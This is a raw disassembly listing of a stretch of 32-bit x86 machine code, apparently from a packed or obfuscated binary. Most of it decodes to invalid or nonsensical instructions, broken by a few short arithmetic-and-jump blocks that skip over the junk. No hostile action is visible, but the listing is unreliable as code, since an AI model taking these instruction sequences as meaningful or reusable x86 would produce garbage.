  40b250:	jp     0x40b2c4
  40b252:	cmp    BYTE PTR [esi+0xc391b4d],al
  40b258:	test   eax,0xf74e1f58
  40b25d:	(bad)  
  40b25e:	jmp    0x40b2ca
  40b260:	repz inc edx
  40b262:	rcr    BYTE PTR [esi],0xe3
  40b265:	psubb  mm3,QWORD PTR [ebp+0x141757c1]
  40b26c:	cmc    
  40b26d:	icebp  
  40b26e:	test   DWORD PTR [esi-0xa],esp
  40b271:	xor    BYTE PTR [ecx],dh
  40b273:	jno    0x40b2c1
  40b275:	pop    ecx
  40b276:	jae    0x40b298
  40b278:	(bad)  
  40b279:	pop    ds
  40b27a:	nop
  40b27b:	dec    esp
  40b27c:	ret    
  40b27d:	and    al,0xd4
  40b27f:	jle    0x40b276
  40b281:	xchg   BYTE PTR [ecx-0x2c3648a8],dh
  40b287:	add    DWORD PTR [esi+0x12],0xffffffdb
  40b28b:	loop   0x40b2d0
  40b28d:	clc    
  40b28e:	push   es
  40b28f:	repz xchg ebp,eax
  40b291:	push   ecx
  40b292:	je     0x40b22c
  40b294:	add    DWORD PTR [ecx],0x2f
  40b297:	lods   al,BYTE PTR ds:[esi]
  40b298:	enter  0x982b,0xa2
  40b29c:	es std 
  40b29e:	pop    gs
  40b2a0:	jge    0x40b2cc
  40b2a2:	cmp    ebx,DWORD PTR [ecx]
  40b2a4:	fldenv [edi-0x31e6988d]
  40b2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2ab:	sti    
  40b2ac:	loopne 0x40b28f
  40b2ae:	outs   dx,DWORD PTR ds:[esi]
  40b2af:	into   
  40b2b0:	aaa    
  40b2b1:	mov    bh,0x97
  40b2b3:	add    dh,ch
  40b2b5:	test   eax,0x57453e3
  40b2ba:	imul   edi,ecx,0xda7efeea
  40b2c0:	or     eax,0xf1d529f0
  40b2c5:	xchg   esp,eax
  40b2c6:	dec    edx
  40b2c7:	add    BYTE PTR [eax],dl
  40b2c9:	inc    eax
  40b2ca:	in     al,0x5a
  40b2cc:	xchg   esi,eax
  40b2cd:	in     eax,0x70
  40b2cf:	jle    0x40b286
  40b2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d2:	inc    esp
  40b2d3:	mov    DWORD PTR [esi+esi*4-0x3c994da4],ebp
  40b2da:	scas   al,BYTE PTR es:[edi]
  40b2db:	data16 mov dl,al
  40b2de:	sub    BYTE PTR [edx+esi*2+0x3240b94],cl
  40b2e5:	mov    ebp,0x7fc37f50
  40b2ea:	sbb    al,0x48
  40b2ec:	es ret 
  40b2ee:	shr    BYTE PTR [edi+0x43e1bc1e],cl
  40b2f4:	pop    es
  40b2f5:	repnz pop esp
  40b2f7:	dec    ebp
  40b2f8:	and    al,0x2a
  40b2fa:	push   ds
  40b2fb:	scas   eax,DWORD PTR es:[edi]
  40b2fc:	fucom  st(1)
  40b2fe:	dec    esi
  40b2ff:	(bad)  
  40b300:	cmc    
  40b301:	sbb    edx,DWORD PTR [edx*4-0x4816e1cd]
  40b308:	xor    DWORD PTR [esi],ecx
  40b30a:	imul   BYTE PTR [ebp+0x1482b035]
  40b310:	enter  0xbedc,0x61
  40b314:	jp     0x40b364
  40b316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b317:	ds or  dh,0x60
  40b31b:	(bad)  
  40b31c:	mov    esi,0xc26af118
  40b321:	jne    0x40b324
  40b323:	xchg   esp,eax
  40b324:	test   dh,dl
  40b326:	loope  0x40b2c6
  40b328:	cmp    DWORD PTR [esi+0x71],eax
  40b32b:	aas    
  40b32c:	into   
  40b32d:	mov    BYTE PTR [edx+0x37],bh
  40b330:	inc    eax
  40b331:	dec    edx
  40b332:	outs   dx,DWORD PTR ds:[esi]
  40b333:	dec    esp
  40b334:	jp     0x40b354
  40b336:	dec    ecx
  40b337:	jecxz  0x40b33e
  40b339:	lods   eax,DWORD PTR ds:[esi]
  40b33a:	into   
  40b33b:	jmp    0xd414:0x3c90797d
  40b342:	sar    BYTE PTR [esi-0x63b52a65],cl
  40b348:	adc    esi,DWORD PTR [edx]
  40b34a:	pop    eax
  40b34b:	in     al,0xb7
  40b34d:	inc    edx
  40b34e:	rcr    DWORD PTR [edx+esi*4+0x21],0xa8
  40b353:	ret    0x51
  40b356:	out    dx,eax
  40b357:	adc    edx,DWORD PTR [eax-0xf7ec72c]
  40b35d:	pop    edi
  40b35e:	call   FWORD PTR [ebp-0x3c]
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	jns    0x40b363
  40b3b3:	hlt    
  40b3b4:	mov    ah,BYTE PTR [ecx-0x6]
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b408
  40b3be:	add    DWORD PTR ss:[esi+0x2946d49],edi
  40b3c5:	imul   ecx,edx,0x13cb0cfe
  40b3cb:	mov    ch,0x2f
  40b3cd:	dec    ecx
  40b3ce:	jl     0x40b380
  40b3d0:	push   es
  40b3d1:	cs cs pop ebx
  40b3d4:	aad    0x50
  40b3d6:	aaa    
  40b3d7:	mov    ecx,0x17b49b60
  40b3dc:	es sub al,0xbe
  40b3df:	adc    bl,al
  40b3e1:	loopne 0x40b3ae
  40b3e3:	jb     0x40b446
  40b3e5:	sahf   
  40b3e6:	call   0x805026f7
  40b3eb:	(bad)  
  40b3ec:	cmp    eax,DWORD PTR [eax]
  40b3ee:	leave  
  40b3ef:	or     DWORD PTR [ebx+0x42],esi
  40b3f2:	popa   
  40b3f3:	cmp    eax,0x8217e139
  40b3f8:	and    DWORD PTR ss:[ecx+0x611170d2],esp
  40b3ff:	(bad)  
  40b400:	and    DWORD PTR [ebp+0x6f],eax
  40b403:	mov    eax,0xd73cf69
  40b408:	pop    ss
  40b409:	pop    esi
  40b40a:	bound  esi,QWORD PTR [edx+0x341a9e23]
  40b410:	sub    bl,BYTE PTR [ebx-0x3bf278a9]
  40b416:	lods   al,BYTE PTR ds:[esi]
  40b417:	push   0x64
  40b419:	and    ch,BYTE PTR [edx-0x6a4d113a]
  40b41f:	stos   BYTE PTR es:[edi],al
  40b420:	bound  edx,QWORD PTR [edx-0x1b]
  40b423:	sub    al,0xb0
  40b425:	sub    BYTE PTR [eax-0xa5915c9],ch
  40b42b:	and    esp,ecx
  40b42d:	outs   dx,BYTE PTR ds:[esi]
  40b42e:	inc    edi
  40b42f:	es pop ebp
  40b431:	inc    esp
  40b432:	or     eax,0xe42ca5bc
  40b437:	adc    eax,esi
  40b439:	sbb    al,0x64
  40b43b:	test   dh,al
  40b43d:	dec    ebx
  40b43e:	sbb    eax,0x9589ecfc
  40b443:	mov    eax,ds:0xf1b04383
  40b448:	jmp    0x6831:0xad068cfa
  40b44f:	jnp    0x40b439
  40b451:	adc    ebp,ebx
  40b453:	fwait
  40b454:	mov    ds:0x239dbc8b,al
  40b459:	mov    eax,ds:0xa9d1d1b8
  40b45e:	rcr    DWORD PTR [ebx+0x363e5d81],0xda
  40b465:	push   cs
  40b466:	mov    ah,0x15
  40b468:	nop
  40b469:	xor    BYTE PTR [esi+0x6f],dl
  40b46c:	sub    al,0xb9
  40b46e:	mov    esi,0x8c99b8db
  40b473:	ins    DWORD PTR es:[edi],dx
  40b474:	adc    BYTE PTR [edx+0x363f2550],0x68
  40b47b:	fwait
  40b47c:	adc    bx,WORD PTR [ebx-0x44ddd7cd]
  40b483:	retf   
  40b484:	popa   
  40b485:	add    al,0xd5
  40b487:	lock add DWORD PTR [edx-0x7fa5a909],ebx
  40b48e:	ret    0x255c
  40b491:	xchg   ebp,eax
  40b492:	push   es
  40b493:	sbb    eax,0xfe6a66ae
  40b498:	mov    esi,0x12332cf4
  40b49d:	sbb    al,0x32
  40b49f:	pop    ebp
  40b4a0:	xchg   edi,eax
  40b4a1:	mov    edx,0xadef6902
  40b4a6:	push   es
  40b4a7:	mov    ebx,0x99fb9b97
  40b4ac:	pop    edi
  40b4ad:	dec    edi
  40b4ae:	cmp    al,bl
  40b4b0:	xor    eax,edx
  40b4b2:	lods   al,BYTE PTR ds:[esi]
  40b4b3:	pop    ebx
  40b4b4:	mov    ebx,0x2f4e8661
  40b4b9:	std    
  40b4ba:	in     eax,0xc9
  40b4bc:	outs   dx,BYTE PTR ds:[esi]
  40b4bd:	mov    al,BYTE PTR [eax+eax*8]
  40b4c0:	add    eax,0xf982f440
  40b4c5:	imul   ebp,DWORD PTR [edi+ecx*4+0x26],0x29
  40b4ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4cb:	std    
  40b4cc:	mov    al,ds:0xb697d6e2
  40b4d1:	sbb    eax,0x6d3eb602
  40b4d6:	push   ds
  40b4d7:	mov    ecx,0x29753c14
  40b4dc:	lods   eax,DWORD PTR ds:[esi]
  40b4dd:	mov    ds:0x66f4f2cd,eax
  40b4e2:	xchg   edx,eax
  40b4e3:	push   ecx
  40b4e4:	mov    es,WORD PTR [edi]
  40b4e6:	dec    esi
  40b4e7:	leave  
  40b4e8:	pusha  
  40b4e9:	test   BYTE PTR [eax+0x3c],0x5c
  40b4ed:	icebp  
  40b4ee:	push   ebp
  40b4ef:	loopne 0x40b564
  40b4f1:	cmp    ebx,0xffffffc6
  40b4f4:	dec    edx
  40b4f5:	ds sbb ebx,esi
  40b4f8:	cs mov al,ds:0x2da07b61
  40b4ff:	pushf  
  40b500:	inc    edi
  40b501:	mov    ah,0xf3
  40b503:	and    al,dh
  40b505:	inc    eax
  40b506:	jg     0x40b53f
  40b508:	jmp    0x40b48c
  40b50a:	inc    eax
  40b50b:	inc    eax
  40b50c:	scas   eax,DWORD PTR es:[edi]
  40b50d:	and    eax,0xf6326bd9
  40b512:	fsub   QWORD PTR [ecx+0x33]
  40b515:	xor    edi,DWORD PTR gs:[eax+0x86a7129]
  40b51c:	pop    esp
  40b51d:	sub    bh,BYTE PTR [ebx-0x3]
  40b520:	xor    al,0x48
  40b522:	imul   esi,DWORD PTR [ebx-0x25],0xfffffffb
  40b526:	aas    
  40b527:	arpl   WORD PTR [edx-0x3d6d6797],di
  40b52d:	jp     0x40b58a
  40b52f:	in     eax,0x58
  40b531:	outs   dx,DWORD PTR ds:[esi]
  40b532:	nop
  40b533:	inc    ecx
  40b534:	jbe    0x40b5a3
  40b536:	sahf   
  40b537:	push   0x67
  40b539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b53a:	xchg   ebx,eax
  40b53b:	pop    ss
  40b53c:	(bad)  
  40b53d:	out    0x21,al
  40b53f:	idiv   BYTE PTR [ebx-0x3200ee76]
  40b545:	and    ch,BYTE PTR [edx-0x63162060]
  40b54b:	adc    al,0x8
  40b54d:	std    
  40b54e:	gs pop esi
  40b550:	push   ds
  40b551:	shr    BYTE PTR [esp+edi*2+0x321f4958],cl
  40b558:	xchg   ecx,eax
  40b559:	and    eax,0xbd41071a
  40b55e:	cmc    
  40b55f:	aam    0xa8
  40b561:	push   ss
  40b562:	(bad)
  40b565:	imul   ecx,ecx,0x90b57ded
  40b56b:	dec    edi
  40b56c:	stc    
  40b56d:	mov    ebx,0x6a8b73ea
  40b572:	dec    esi
  40b573:	adc    BYTE PTR [esi+0x55],bl
  40b576:	cs or  esi,esp
  40b579:	pop    ebx
  40b57a:	push   edx
  40b57b:	xchg   edx,eax
  40b57c:	mov    ds:0xa3a0710,eax
  40b581:	push   cs
  40b582:	pop    esi
  40b583:	sub    al,0xe9
  40b585:	adc    BYTE PTR [esi],dh
  40b587:	leave  
  40b588:	xor    bl,BYTE PTR [ecx-0x15]
  40b58b:	xchg   esi,eax
  40b58c:	mov    eax,DWORD PTR [eax-0x46]
  40b58f:	adc    eax,0x15f90541
  40b594:	lea    edx,[eax+0x1352c99a]
  40b59a:	icebp  
  40b59b:	pop    ss
  40b59c:	mov    ch,0x8
  40b59e:	mov    ecx,0x56370760
  40b5a3:	in     eax,0x9c
  40b5a5:	clc    
  40b5a6:	loop   0x40b60a
  40b5a8:	lods   al,BYTE PTR ds:[esi]
  40b5a9:	stos   BYTE PTR es:[edi],al
  40b5aa:	test   eax,0x7a29aa4d
  40b5af:	pop    ss
  40b5b0:	retf   0x7937
  40b5b3:	(bad)
  40b5b6:	pop    es
  40b5b7:	dec    ebp
  40b5b8:	daa    
  40b5b9:	dec    edi
  40b5ba:	xchg   ebp,eax
  40b5bb:	cdq    
  40b5bc:	pushf  
  40b5bd:	fwait
  40b5be:	jmp    0xf2ac:0xbca51de9
  40b5c5:	jmp    0x130975e2
  40b5ca:	fld    QWORD PTR [edx-0x58]
  40b5cd:	inc    edi
  40b5ce:	lea    esi,[esi]
  40b5d0:	popf   
  40b5d1:	pop    edi
  40b5d2:	aaa    
  40b5d3:	xchg   ebp,eax
  40b5d4:	mov    edi,0xa8bc24c2
  40b5d9:	mov    esi,fs
  40b5db:	scas   al,BYTE PTR es:[edi]
  40b5dc:	pop    ds
  40b5dd:	inc    ebx
  40b5de:	mov    al,ds:0x538bdb9b
  40b5e3:	sub    al,0xf2
  40b5e5:	pop    esi
  40b5e6:	lea    eax,[eax+0x7326f185]
  40b5ec:	icebp  
  40b5ed:	dec    edx
  40b5ee:	mov    edx,0x76f4ef4b
  40b5f3:	das    
  40b5f4:	xchg   edi,eax
  40b5f5:	retf   
  40b5f6:	loop   0x40b637
  40b5f8:	sub    ebp,DWORD PTR [ebx+0x6]
  40b5fb:	sbb    BYTE PTR [ecx-0x43b51e4d],ah
  40b601:	lock (bad) 
  40b604:	sbb    bl,BYTE PTR [edx-0x24]
  40b607:	ins    BYTE PTR es:[edi],dx
  40b608:	cdq    
  40b609:	cwde   
  40b60a:	mov    esi,DWORD PTR [eax+0x62]
  40b60d:	add    ch,dl
  40b60f:	arpl   WORD PTR [ebx],sp
  40b611:	xchg   ecx,eax
  40b612:	dec    esp
  40b613:	add    DWORD PTR [eax-0x34],edx
  40b616:	retf   
  40b617:	xchg   ebx,eax
  40b618:	jns    0x40b5ea
  40b61a:	or     eax,0xfd1bec42
  40b61f:	jg     0x40b66e
  40b621:	push   0x79
  40b623:	sub    ebp,DWORD PTR ds:0xe5d1c8c8
  40b629:	mov    BYTE PTR ds:0xfb63f081,cl
  40b62f:	retf   0xdb81
  40b632:	icebp  
  40b633:	sub    al,0x56
  40b635:	mov    esi,0xc59b4e82
  40b63a:	out    0x86,al
  40b63c:	pop    edx
  40b63d:	outs   dx,DWORD PTR ds:[esi]
  40b63e:	push   0x14
  40b640:	xor    eax,0xf9b55da
  40b645:	mov    edi,0x9f49786
  40b64a:	xchg   esp,eax
  40b64b:	push   edi
  40b64c:	int3   
  40b64d:	ror    BYTE PTR [ebx-0x2b],1
  40b650:	loope  0x40b62a
  40b652:	ds mov dl,0xb4
  40b655:	rcr    DWORD PTR cs:[edi-0x72],cl
  40b659:	inc    ebp
  40b65a:	clc    
  40b65b:	(bad)  
  40b65c:	stos   DWORD PTR es:[edi],eax
  40b65d:	or     dh,bl
  40b65f:	clc    
  40b660:	test   BYTE PTR [ebx],dh
  40b662:	shl    DWORD PTR [edx+0x34],1
  40b665:	jle    0x40b64d
  40b667:	jge    0xbdf52b93
  40b66d:	jno    0x40b640
  40b66f:	sbb    eax,0x34baa10c
  40b674:	and    al,dl
  40b676:	pop    ebx
  40b677:	dec    eax
  40b678:	push   es
  40b679:	das    
  40b67a:	sub    cl,ah
  40b67c:	pusha  
  40b67d:	cdq    
  40b67e:	loop   0x40b608
  40b680:	sar    DWORD PTR [edx-0x356c184],0xa8
  40b687:	mov    ds:0x64a4aced,eax
  40b68c:	jmp    0x40b702
  40b68e:	jmp    0xecc02163
  40b693:	imul   DWORD PTR [esi+ecx*2-0x63]
  40b697:	or     eax,0x5cd5ba62
  40b69c:	and    ebp,edi
  40b69e:	das    
  40b69f:	and    al,0x5d
  40b6a1:	jmp    0x40b629
  40b6a3:	jg     0x40b69b
  40b6a5:	adc    DWORD PTR [eax],ebp
  40b6a7:	retf   
  40b6a8:	repz loop 0x40b67f
  40b6ab:	sub    BYTE PTR [edi-0x21],dl
  40b6ae:	in     eax,dx
  40b6af:	dec    ebp
  40b6b0:	mov    ah,0xe8
  40b6b2:	fwait
  40b6b3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b6b5:	push   0x22
  40b6b7:	sbb    BYTE PTR [eax+eiz*2+0x8],bh
  40b6bb:	stos   DWORD PTR es:[edi],eax
  40b6bc:	aas    
  40b6bd:	(bad)  
  40b6be:	in     al,dx
  40b6bf:	xlat   BYTE PTR ds:[ebx]
  40b6c0:	neg    ebp
  40b6c2:	out    0xa4,al
  40b6c4:	popa   
  40b6c5:	leave  
  40b6c6:	lods   al,BYTE PTR ds:[esi]
  40b6c7:	adc    dh,BYTE PTR [ebx-0x1bd8fd5]
  40b6cd:	push   ss
  40b6ce:	cld    
  40b6cf:	test   DWORD PTR [ecx],esi
  40b6d1:	sub    al,0x1
  40b6d3:	outs   dx,BYTE PTR ds:[esi]
  40b6d4:	test   DWORD PTR [esi],esi
  40b6d6:	inc    ebp
  40b6d7:	cmp    BYTE PTR [esi+0x79a4cfcd],0xb2
  40b6de:	jns    0x40b722
  40b6e0:	push   ebp
  40b6e1:	xor    BYTE PTR [edx+0x28b56f50],dl
  40b6e7:	cld    
  40b6e8:	xor    dh,BYTE PTR [ebp+0x42]
  40b6eb:	fsub   QWORD PTR [ebx-0x64bd3dc0]
  40b6f1:	mov    ds:0xce9cc1da,al
  40b6f6:	gs (bad) 
  40b6f9:	mov    ds:0x2e603aef,eax
  40b6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ff:	pop    esi
  40b700:	or     edx,DWORD PTR [edi+0x2784689d]
  40b706:	xor    DWORD PTR [eax+eiz*4],ebp
  40b709:	cs popa 
  40b70b:	outs   dx,BYTE PTR ds:[esi]
  40b70c:	addr16 int 0x9
  40b70f:	das    
  40b710:	imul   ecx,DWORD PTR [eax+0x2d],0xf833d033
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b6e7
  40b743:	xor    BYTE PTR [edi],dh
  40b745:	cmp    DWORD PTR [edi],0xca7c7c86
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b755
  40b74f:	mov    dh,0xb7
  40b751:	(bad)  
  40b752:	imul   DWORD PTR [ebx]
  40b754:	push   esp
  40b755:	imul   edi,DWORD PTR [ecx],0xef58c0a4
  40b75b:	popf   
  40b75c:	sbb    al,0xbc
  40b75e:	dec    ebp
  40b75f:	(bad)  
  40b760:	pop    ds
  40b761:	push   edx
  40b762:	push   ecx
  40b763:	mov    esi,DWORD PTR [eax]
  40b765:	pop    edi
  40b766:	test   WORD PTR [ebx+0x7ee9844e],cx
  40b76d:	jno    0x40b74f
  40b76f:	aad    0x90
  40b771:	jno    0x40b758
  40b773:	in     al,0x61
  40b775:	rol    DWORD PTR [esi+eax*8],0xe8
  40b779:	test   ebp,ecx
  40b77b:	js     0x40b770
  40b77d:	inc    edi
  40b77e:	and    dh,BYTE PTR [edx+0x65]
  40b781:	dec    edi
  40b782:	and    BYTE PTR [eax+eiz*2-0x1bd42522],ah
  40b789:	dec    eax
  40b78a:	push   ds
  40b78b:	fadd   QWORD PTR [eiz*1+0x3a19b0a]
  40b792:	sar    DWORD PTR [eax+0x4d],0xd7
  40b796:	and    eax,0x9666ba23
  40b79b:	mov    al,0x14
  40b79d:	aam    0x7c
  40b79f:	jge    0x40b770
  40b7a1:	mov    ebp,0x5275aca8
  40b7a6:	sbb    BYTE PTR [eax-0x77],ch
  40b7a9:	int3   
  40b7aa:	add    eax,0xb13ffd17
  40b7af:	pop    ebp
  40b7b0:	repz adc al,0xd1
  40b7b3:	push   ds
  40b7b4:	in     eax,dx
  40b7b5:	xor    esp,eax
  40b7b7:	push   0xffffffa9
  40b7b9:	(bad)  
  40b7ba:	xlat   BYTE PTR ds:[ebx]
  40b7bb:	in     eax,dx
  40b7bc:	fst    QWORD PTR [ebx]
  40b7be:	mov    ds:0x52e2127f,al
  40b7c3:	and    DWORD PTR [edx+0x513fcf4],ecx
  40b7c9:	(bad)  
  40b7ca:	xchg   esi,eax
  40b7cb:	push   ecx
  40b7cc:	mov    eax,0x30fe6ca7
  40b7d1:	mov    bl,0x2c
  40b7d3:	test   BYTE PTR [ebp+0x76ef960],al
  40b7d9:	js     0x40b85a
  40b7db:	mov    cs,WORD PTR [esi]
  40b7dd:	ret    
  40b7de:	mov    BYTE PTR [eax+0x69],ah
  40b7e1:	pop    eax
  40b7e2:	cmp    BYTE PTR ds:0xc37cc8b,cl
  40b7e8:	add    eax,0x1701bb94
  40b7ed:	out    dx,al
  40b7ee:	dec    ebx
  40b7ef:	cmp    al,0xf4
  40b7f1:	out    0x95,eax
  40b7f3:	push   ebx
  40b7f4:	cs and DWORD PTR gs:[ecx],esp
  40b7f8:	mov    edi,ebx
  40b7fa:	sar    BYTE PTR [ebp-0x51e2117a],0xcb
  40b801:	pusha  
  40b802:	ja     0x40b7b7
  40b804:	(bad)  
  40b805:	sbb    al,0x92
  40b807:	sub    al,0x16
  40b809:	cld    
  40b80a:	test   al,0xf9
  40b80c:	sub    ah,al
  40b80e:	and    al,0x59
  40b810:	nop
  40b811:	outs   dx,BYTE PTR ds:[esi]
  40b812:	or     DWORD PTR [edx+0x73151d12],esi
  40b818:	pop    ecx
  40b819:	jge    0x40b87c
  40b81b:	jnp    0x40b883
  40b81d:	loop   0x40b87c
  40b81f:	push   ss
  40b820:	retf   
  40b821:	gs js  0x40b851
  40b824:	adc    DWORD PTR [edi],0x92dea59c
  40b82a:	daa    
  40b82b:	jb     0x40b86f
  40b82d:	pop    ds
  40b82e:	jle    0x40b893
  40b830:	xor    BYTE PTR [ebx-0x79b46cee],cl
  40b836:	pop    edx
  40b837:	pop    esp
  40b838:	shl    ebx,0x3c
  40b83b:	cdq    
  40b83c:	or     al,0xa8
  40b83e:	add    BYTE PTR [edx],ch
  40b840:	lahf   
  40b841:	add    BYTE PTR [edx+0x2b],bl
  40b844:	push   esp
  40b845:	aaa    
  40b846:	int3   
  40b847:	add    eax,0xce69f79c
  40b84c:	ret    0x1c52
  40b84f:	push   esp
  40b851:	gs push ss
  40b853:	out    0x10,eax
  40b855:	loopne 0x40b852
  40b857:	popf   
  40b858:	adc    dh,BYTE PTR [ecx]
  40b85a:	repz jmp 0xbe0fa33d
  40b860:	stos   BYTE PTR es:[edi],al
  40b861:	xor    al,0x3f
  40b863:	sub    DWORD PTR [ecx-0x23],ebx
  40b866:	sbb    al,0xca
  40b868:	push   edi
  40b869:	arpl   WORD PTR [eax+0xd],sp
  40b86c:	add    ebp,ecx
  40b86e:	test   eax,0xb46a7ef5
  40b873:	adc    dl,cl
  40b875:	mov    esp,0xe6c25d6c
  40b87a:	inc    ecx
  40b87b:	in     al,0x6c
  40b87d:	dec    ebp
  40b87e:	arpl   ax,dx
  40b880:	add    eax,0x58b5f429
  40b885:	imul   edx
  40b887:	retf   
  40b888:	push   ebx
  40b889:	lods   eax,DWORD PTR ds:[esi]
  40b88a:	bound  ebx,QWORD PTR [eax+0x49c698f2]
  40b890:	pop    esi
  40b891:	sub    al,0xb5
  40b893:	or     cl,BYTE PTR [ebx]
  40b895:	dec    edi
  40b896:	or     edx,esi
  40b898:	out    dx,eax
  40b899:	or     ecx,DWORD PTR es:[edi+0x3c68ec84]
  40b8a0:	test   eax,0x5c115f62
  40b8a5:	and    al,0x7e
  40b8a7:	retf   
  40b8a8:	pusha  
  40b8a9:	xchg   BYTE PTR [eax],cl
  40b8ab:	outs   dx,BYTE PTR ds:[esi]
  40b8ac:	(bad)  
  40b8ad:	dec    ebp
  40b8af:	push   ecx
  40b8b0:	push   ebx
  40b8b1:	cmp    eax,0xe34eb51a
  40b8b6:	xor    eax,0xa93e93bc
  40b8bb:	fidiv  WORD PTR [eax]
  40b8bd:	call   0x293a:0xf113ea3a
  40b8c4:	aad    0xf3
  40b8c6:	jle    0x40b93b
  40b8c8:	adc    BYTE PTR [eax*8+0x640c2f27],dh
  40b8cf:	pushf  
  40b8d0:	dec    ebx
  40b8d1:	stos   DWORD PTR es:[edi],eax
  40b8d2:	adc    BYTE PTR [esi-0x67],0x71
  40b8d6:	cmp    dl,bh
  40b8d8:	popa   
  40b8d9:	dec    edx
  40b8da:	dec    ebx
  40b8db:	mov    bl,0x89
  40b8dd:	(bad)  
  40b8e1:	je     0x40b91f
  40b8e3:	xor    eax,0xa50a578a
  40b8e8:	push   ecx
  40b8e9:	jns    0x40b949
  40b8eb:	ret    0xaa54
  40b8ee:	cmp    eax,0x24ac695e
  40b8f3:	mov    cl,0xbd
  40b8f5:	jns    0x40b946
  40b8f7:	shl    BYTE PTR [esi-0x6d],1
  40b8fa:	repz int 0x1b
  40b8fd:	or     eax,0x1a78ff36
  40b902:	pop    eax
  40b903:	inc    ecx
  40b904:	dec    BYTE PTR [esi-0x617006a]
  40b90a:	or     dl,ch
  40b90c:	or     BYTE PTR [ebx+edi*1+0x34],bl
  40b910:	mov    ebx,0xf393e249
  40b915:	and    cl,BYTE PTR [edi]
  40b917:	mov    bl,0x82
  40b919:	je     0x40b8fd
  40b91b:	inc    edx
  40b91c:	pop    esi
  40b91d:	cmp    BYTE PTR [edi+edx*8-0x51],bl
  40b921:	adc    esi,DWORD PTR [esi+edi*4]
  40b924:	fnstcw WORD PTR [ebx-0x7e31cf8e]
  40b92a:	dec    eax
  40b92b:	sbb    esp,DWORD PTR [esp+esi*4]
  40b92e:	(bad)  
  40b92f:	sbb    BYTE PTR [ecx],dl
  40b931:	fidivr DWORD PTR ds:0x423d00b6
  40b937:	mov    eax,ds:0xeea52012
  40b93c:	fadd   DWORD PTR [edx+0x3ce98529]
  40b942:	ficom  WORD PTR [ecx+0x79]
  40b945:	aaa    
  40b946:	sbb    eax,0xce7cb6ef
  40b94b:	out    0xd1,al
  40b94d:	mov    esp,0x35394659
  40b952:	cs in  eax,0x13
  40b955:	fadd   QWORD PTR [ecx]
  40b957:	cmp    eax,0xd849b79a
  40b95c:	cmp    BYTE PTR [edi+0x61],0x4c
  40b960:	dec    DWORD PTR [esi]
  40b962:	js     0x40b962
  40b964:	scas   eax,DWORD PTR es:[edi]
  40b965:	adc    esp,DWORD PTR [edx]
  40b967:	data16 fidivr WORD PTR [edi]
  40b96a:	and    esp,ebp
  40b96c:	sbb    eax,0x3339929b
  40b971:	iret   
  40b972:	test   al,0xd9
  40b974:	daa    
  40b975:	xchg   edx,eax
  40b976:	mov    dh,0x9a
  40b978:	sti    
  40b979:	aad    0x88
  40b97b:	(bad)  [ebx-0x772153ee]
  40b981:	cmp    esi,ebx
  40b983:	aas    
  40b984:	fnsave [eax-0x26cf230f]
  40b98a:	mov    cs,WORD PTR [ebx-0x2b]
  40b98d:	bound  ebx,QWORD PTR [ebx+0x64]
  40b990:	lods   eax,DWORD PTR ds:[esi]
  40b991:	scas   eax,DWORD PTR es:[edi]
  40b992:	std    
  40b993:	mov    bl,0x79
  40b995:	pop    ecx
  40b996:	stos   BYTE PTR es:[edi],al
  40b997:	sbb    dh,BYTE PTR [edx]
  40b999:	lods   al,BYTE PTR ds:[esi]
  40b99a:	cmp    BYTE PTR [eax+0x54],cl
  40b99d:	inc    ecx
  40b99e:	adc    al,0xde
  40b9a0:	btc    ecx,0x60
  40b9a4:	jl     0x40b9cb
  40b9a6:	sub    edx,DWORD PTR [eax-0x69]
  40b9a9:	bound  ebx,QWORD PTR [ecx-0x6b]
  40b9ac:	arpl   WORD PTR ds:0xfe0728da,bx
  40b9b2:	adc    BYTE PTR [ebx-0xa],dl
  40b9b5:	xchg   esp,eax
  40b9b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b7:	(bad)  
  40b9b8:	mov    dl,0x25
  40b9ba:	outs   dx,DWORD PTR ds:[esi]
  40b9bb:	add    ebp,edi
  40b9bd:	pop    ss
  40b9be:	nop
  40b9bf:	lock shl DWORD PTR ds:0xb1145a88,0xe
  40b9c7:	mov    edi,0x8e84f458
  40b9cc:	lock add DWORD PTR [ebx+0x2912415a],ebx
  40b9d3:	jl     0x40b96b
